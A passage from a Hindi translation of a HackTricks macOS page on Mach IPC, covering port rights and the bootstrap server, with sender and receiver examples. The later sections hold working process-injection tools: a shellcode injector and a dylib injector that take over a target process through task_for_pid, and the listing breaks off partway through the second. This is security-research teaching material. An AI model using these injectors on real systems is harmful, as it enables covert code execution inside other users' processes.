# macOS IPC - इंटर प्रोसेस कम्यूनिकेशन

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> के साथ सीखें जीरो से हीरो तक AWS हैकिंग!</summary>

HackTricks का समर्थन करने के अन्य तरीके:

* अगर आप अपनी कंपनी का विज्ञापन HackTricks में देखना चाहते हैं या **HackTricks को PDF में डाउनलोड** करना चाहते हैं तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह, **The PEASS Family** की खोज करें
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)** पर फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें** द्वारा **PRs** सबमिट करके [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में।

</details>

## पोर्ट के माध्यम से Mach संदेश

### मौलिक जानकारी

Mach **कार्यों** का उपयोग संसाधन साझा करने के लिए **सबसे छोटी इकाई** के रूप में करता है, और प्रत्येक कार्य में **कई धागे** हो सकते हैं। ये **कार्य और धागे POSIX प्रक्रियाओं और धागों के लिए 1:1 मैप किए गए हैं**।

कार्यों के बीच संचार Mach इंटर-प्रोसेस कम्यूनिकेशन (IPC) के माध्यम से होता है, जिसमें एक-तरफा संचार चैनल का उपयोग किया जाता है। **संदेश पोर्टों के बीच स्थानांतरित किए जाते हैं**, जो कर्नेल द्वारा प्रबंधित **संदेश कतारों** की तरह कार्य करते हैं।

प्रत्येक प्रक्रिया के पास एक **IPC तालिका** होती है, जिसमें प्रक्रिया के **mach पोर्ट्स** पाए जा सकते हैं। मच पोर्ट का नाम वास्तव में एक संख्या है (कर्नेल ऑब्जेक्ट के लिए एक पॉइंटर)।

एक प्रक्रिया एक पोर्ट नाम कुछ अधिकारों के साथ **एक अलग कार्य** को भेज सकती है और कर्नेल इसे **दूसरे कार्य की IPC तालिका में एंट्री** बना देगा।

### पोर्ट अधिकार

पोर्ट अधिकार, जो यह निर्धारित करते हैं कि एक कार्य किस कार्रवाई कर सकता है, इस संचार के लिए महत्वपूर्ण हैं। संभावित **पोर्ट अधिकार** हैं ([यहाँ से परिभाषाएँ](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

* **प्राप्ति अधिकार**, जो पोर्ट को भेजे गए संदेश प्राप्त करने की अनुमति देता है। Mach पोर्ट MPSC (एकाधिक उत्पादक, एक उपभोक्ता) कतारें हैं, जिसका अर्थ है कि पूरे सिस्टम में हर पोर्ट के लिए केवल **एक प्राप्ति अधिकार** हो सकता है (जैसे कि पाइप्स में, जहां कई प्रक्रियाएं सभी एक पाइप के पढ़ने के लिए फ़ाइल डिस्क्रिप्टर्स को धारण कर सकती हैं)।
* **प्राप्ति अधिकार वाला** एक कार्य संदेश प्राप्त कर सकता है और **सेंड अधिकार बना सकता है**, जिससे उसे संदेश भेजने की अनुमति मिलती है। मूल रूप से केवल **अपने कार्य के पास अपना पोर्ट प्राप्ति अधिकार होता है**।
* **सेंड अधिकार**, जो पोर्ट को संदेश भेजने की अनुमति देता है।
* सेंड अधिकार को **क्लोन** किया जा सकता है ताकि सेंड अधिकार के मालिक एक क्लोन बना सके और इसे **तीसरे कार्य को प्रदान** कर सके।
* **एक बार सेंड अधिकार**, जो पोर्ट को एक संदेश भेजने की अनुमति देता है और फिर गायब हो जाता है।
* **पोर्ट सेट अधिकार**, जो एक _पोर्ट सेट_ को दर्शाता है बल्कि एक एकल पोर्ट नहीं। पोर्ट सेट से संदेश को एक पोर्ट में से निकालना होता है। पोर्ट सेट का उपयोग कई पोर्टों पर समय-समय पर सुनने के लिए किया जा सकता है, जैसे कि Unix में `select`/`poll`/`epoll`/`kqueue`।
* **मृत नाम**, जो वास्तव में एक पोर्ट अधिकार नहीं है, बल्कि केवल एक जगहधारी है। जब एक पोर्ट नष्ट होता है, तो पोर्ट के सभी मौजूदा पोर्ट अधिकार मृत नाम में बदल जाते हैं।

**कार्य अन्यों को SEND अधिकार स्थानांतरित कर सकते हैं**, जिससे उन्हें संदेश भेजने की अनुमति मिले। **SEND अधिकार को क्लोन भी किया जा सकता है**, ताकि एक कार्य एक तीसरे कार्य को दुहरा सके और अधिकार दे सके। यह, **बूटस्ट्रैप सर्वर** के एक मध्यस्थ प्रक्रिया के साथ मिलाकर, कार्यों के बीच प्रभावी संचार की अनुमति देता है।

### संचार स्थापित करना

#### चरण:

जैसा कि उल्लिखित है, संचार चैनल स्थापित करने के लिए **बूटस्ट्रैप सर्वर** (**mac में launchd**) शामिल होता है।

1. कार्य **A** एक **नया पोर्ट** प्रारंभ करता है, प्रक्रिया में **प्राप्ति अधिकार** प्राप्त करता है।
2. कार्य **A**, प्राप्ति अधिकार के धारक होने के नाते, **पोर्ट के लिए एक सेंड अधिकार उत्पन्न करता है**।
3. कार्य **A** बूटस्ट्रैप सर्वर के साथ एक **कनेक्शन स्थापित** करता है, **पोर्ट की सेवा नाम** और **सेंड अधिकार** प्रदान करता है जिसे बूटस्ट्रैप रजिस्टर के रूप में जाना जाता है।
4. कार्य **B** उस सेवा के लिए बूटस्ट्रैप सर्वर के साथ बातचीत करता है जिसके लिए बूटस्ट्रैप **लुकअप** करता है। यदि सफल होता है, तो **सर्वर SEND अधिकार** को दुहराता है जो कार्य A से प्राप्त किया गया था और **कार्य B को स्थानांतरित करता है**।
5. SEND अधिकार प्राप्त करने के बाद, कार्य **B** क्षमताशाली होता है **एक संदेश को तैयार** करने और इसे **कार्य A** को भेजने के लिए भेजने की।
6. द्विदिशीय संचार के लिए सामान्यत: कार्य **B** एक **प्राप्ति** अधिकार और एक **सेंड** अधिकार वाला एक नया पोर्ट उत्पन्न करता है, और **कार्य A को सेंड अधिकार देता है** ताकि वह कार्य B को संदेश भेज सके (द्विदिशीय संचार)।

बूटस्ट्रैप सर्वर **प्रमाणित नहीं कर सकता** कि किसी कार्य द्वारा दावा किए गए सेवा नाम की पुष्टि करें। इसका अर्थ है कि एक **कार्य** संभावित रूप से **किसी भी सिस्टम कार्य का अनुकरण** कर सकता है, जै
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
प्रक्रियाएँ जिनके पास _**प्राप्ति अधिकार**_ हैं, वे Mach पोर्ट पर संदेश प्राप्त कर सकती हैं। उल्टे, **भेजने वाले** को _**भेजने का**_ या _**एक बार भेजने का अधिकार**_ प्रदान किया जाता है। एक बार भेजने का अधिकार केवल एक संदेश भेजने के लिए है, उसके बाद यह अमान्य हो जाता है।

एक सरल **द्विदिशील संचार** प्राप्त करने के लिए एक प्रक्रिया मशीन **संदेश हेडर** में एक मशीन **पोर्ट** निर्दिष्ट कर सकती है जिसे _उत्तर पोर्ट_ (**`msgh_local_port`**) कहा जाता है जहां संदेश के **प्राप्तकर्ता** इस संदेश का **उत्तर भेज** सकता है। **`msgh_bits`** में बिटफ्लैग का उपयोग किया जा सकता है ताकि इस पोर्ट के लिए एक **एक बार भेजने का अधिकार** उत्पन्न और स्थानांतरित किया जा सके (`MACH_MSG_TYPE_MAKE_SEND_ONCE`).

{% hint style="success" %}
ध्यान दें कि इस प्रकार के द्विदिशील संचार का उपयोग XPC संदेशों में किया जाता है जो एक प्रतिक्रिया की उम्मीद रखते हैं (`xpc_connection_send_message_with_reply` और `xpc_connection_send_message_with_reply_sync`). लेकिन **आम तौर पर विभिन्न पोर्ट बनाए जाते हैं** जैसा पहले स्पष्ट किया गया है ताकि द्विदिशील संचार बनाया जा सके।
{% endhint %}

संदेश हेडर के अन्य फ़ील्ड हैं:

* `msgh_size`: पूरे पैकेट का आकार।
* `msgh_remote_port`: जिस पोर्ट पर यह संदेश भेजा गया है।
* `msgh_voucher_port`: [mach vouchers](https://robert.sesek.com/2023/6/mach\_vouchers.html)।
* `msgh_id`: इस संदेश का आईडी, जिसे प्राप्तकर्ता द्वारा व्याख्या किया जाता है।

{% hint style="danger" %}
ध्यान दें कि **mach संदेश** एक **_mach पोर्ट_** के माध्यम से भेजे जाते हैं, जो मशीन के मच कर्नल में बनाया गया **एकल प्राप्तकर्ता**, **एकाधिक भेजने वाला** संचार चैनल है। **एकाधिक प्रक्रियाएँ** एक मच पोर्ट पर संदेश भेज सकती हैं, लेकिन किसी भी समय केवल **एक प्रक्रिया** इसे पढ़ सकती है।
{% endhint %}

### पोर्टों की गणना
```bash
lsmp -p <pid>
```
आप इस टूल को iOS में इंस्टॉल कर सकते हैं, इसे [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz) से डाउनलोड करके।

### कोड उदाहरण

ध्यान दें कि **भेजने वाला** एक पोर्ट आवंटित करता है, `org.darlinghq.example` नाम के लिए एक **भेजने का हक** बनाता है और इसे **बूटस्ट्रैप सर्वर** को भेजता है जबकि भेजने वाला उस नाम का **भेजने का हक** मांगता है और उसे उसने **संदेश भेजने** के लिए उपयोग किया।

{% tabs %}
{% tab title="receiver.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{% endtab %}

{% tab title="sender.c" %}हमने एक नया प्रोसेस बनाया है जो एक मैसेज भेजने के लिए IPC (इंटर प्रोसेस कम्युनिकेशन) का उपयोग करता है। यहाँ हमने एक मैसेज क्यू बनाई है और उसमें एक मैसेज भेजा है। %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
### विशेषाधिकारित पोर्ट

* **होस्ट पोर्ट**: यदि किसी प्रक्रिया के पास इस पोर्ट पर **भेजने** की अनुमति है तो वह **सिस्टम** के बारे में **जानकारी** प्राप्त कर सकता है (जैसे `host_processor_info`।)
* **होस्ट प्रिव पोर्ट**: इस पोर्ट पर **भेजने** के अधिकार वाली प्रक्रिया उच्चाधिकारित क्रियाएँ कर सकती है जैसे कर्नेल एक्सटेंशन लोड करना। **प्रक्रिया को रूट होना चाहिए** इस अनुमति को प्राप्त करने के लिए।
* इसके अतिरिक्त, **`kext_request`** API को बुलाने के लिए अन्य entitlements **`com.apple.private.kext*`** की आवश्यकता है जो केवल एप्पल बाइनरी को दी जाती है।
* **कार्य नाम पोर्ट:** _कार्य पोर्ट_ का अनुचित संस्करण। यह कार्य को संदर्भित करता है, लेकिन इसे नियंत्रित करने की अनुमति नहीं देता। इसके माध्यम से केवल `task_info()` उपलब्ध लगता है।
* **कार्य पोर्ट** (जिसे कर्नेल पोर्ट भी कहा जाता है)**:** इस पोर्ट पर भेजने के स्वीकृति के साथ कार्य को नियंत्रित करना संभव है (मेमोरी पढ़ना/लिखना, थ्रेड बनाना...।)
* कॉल करें `mach_task_self()` इस पोर्ट के लिए कॉलर कार्य के लिए नाम प्राप्त करने के लिए। यह पोर्ट केवल **`exec()`** के अवरोध के साथ विरासत में मिलता है; `fork()` के साथ नया कार्य बनाया जाता है (एक विशेष मामले के रूप में, एक कार्य को भी `exec()` के बाद एक नया कार्य पोर्ट मिलता है एक suid बाइनरी में)। कार्य को उत्पन्न करने और इसका पोर्ट प्राप्त करने का एकमात्र तरीका है ["पोर्ट स्वैप नृत्य"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) करते समय `fork()` करते समय।
* इस पोर्ट तक पहुंचने की प्रतिबंधाएं (बाइनरी `AppleMobileFileIntegrity` से `macos_task_policy` से):
* यदि ऐप के पास **`com.apple.security.get-task-allow` entitlement** है तो **एक ही उपयोगकर्ता के प्रक्रियाएँ कार्य पोर्ट तक पहुंच सकती हैं** (डीबगिंग के लिए Xcode द्वारा सामान्य रूप से जोड़ा जाता है)। **नोटराइजेशन** प्रक्रिया इसे उत्पादन रिलीज़ में नहीं देगी।
* **`com.apple.system-task-ports`** entitlement वाली ऐप्स किसी भी प्रक्रिया के लिए **कार्य पोर्ट प्राप्त कर सकती हैं**, केवल कर्नेल को छोड़कर। पुराने संस्करणों में इसे **`task_for_pid-allow`** कहा जाता था। यह केवल एप्पल एप्लिकेशन्स को प्रदान किया जाता है।
* **रूट किसी भी** हार्डन किए गए रनटाइम के साथ कंपाइल नहीं की गई ऐप्स के **कार्य पोर्ट तक पहुंच सकता है** (और ना ही एप्पल से)।

### शैलकोड इंजेक्शन थ्रेड के माध्यम से कार्य पोर्ट में&#x20;

आप यहाँ से एक शैलकोड प्राप्त कर सकते हैं:

{% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}

{% tabs %}
{% tab title="mysleep.m" %}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{% endtab %}

{% tab title="entitlements.plist" %}हार्डवेयर एक्सेस और इंटर-प्रोसेस कम्यूनिकेशन के लिए एंटाइटलमेंट्स प्लिस्ट।{% endtab %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

पिछले प्रोग्राम को **कंपाइल** करें और कोड इंजेक्शन करने के लिए **एंटाइटलमेंट्स** जोड़ें ताकि आप उसी उपयोगकर्ता के साथ कोड इंजेक्शन कर सकें (अगर नहीं तो आपको **sudo** का उपयोग करना होगा)।

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector

#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
### Dylib Injection in thread via Task port

macOS में **threads** को **Mach** का उपयोग करके या **posix `pthread` api** का उपयोग करके मनिपुलेट किया जा सकता है। हमने पिछले इंजेक्शन में उत्पन्न किए गए thread को Mach api का उपयोग करके उत्पन्न किया था, इसलिए **यह posix compliant नहीं है**।

एक सरल शैलकोड को इंजेक्ट करना संभव था ताकि एक कमांड को निष्पादित किया जा सके क्योंकि इसे **posix compliant एपीआई के साथ काम करने की आवश्यकता नहीं थी**, केवल Mach के साथ। **अधिक जटिल इंजेक्शन** के लिए **thread** को भी **posix compliant** होना चाहिए।

इसलिए, **thread** को **सुधारने** के लिए यह कॉल करना चाहिए **`pthread_create_from_mach_thread`** जो एक वैध pthread बनाएगा। फिर, इस नए pthread को **dlopen** को कॉल करने के लिए किया जा सकता है **सिस्टम से एक dylib लोड करने** के लिए, इसलिए नए shellcode लिखने की बजाय विभिन्न क्रियाएँ करने के लिए कस्टम पुस्तकालयों को लोड करना संभव है।

आप (उदाहरण के लिए जो एक लॉग उत्पन्न करता है और फिर आप इसे सुन सकते हैं) में **उदाहरण dylibs** पा सकते हैं:

{% content-ref url="../../macos-dyld-hijacking-and-dyld_insert_libraries.md" %}
[macos-dyld-hijacking-and-dyld\_insert\_libraries.md](../../macos-dyld-hijacking-and-dyld\_insert\_libraries.md)
{% endcontent-ref %}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

